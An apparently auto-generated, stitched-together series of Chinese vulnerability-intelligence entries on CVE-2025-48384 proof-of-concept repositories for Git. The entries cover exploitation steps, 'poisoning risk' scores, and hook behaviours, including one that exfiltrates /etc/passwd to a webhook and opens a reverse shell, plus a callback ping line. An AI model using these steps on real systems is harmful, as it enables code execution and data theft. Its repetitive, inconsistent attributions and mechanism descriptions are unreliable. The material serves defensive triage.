**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
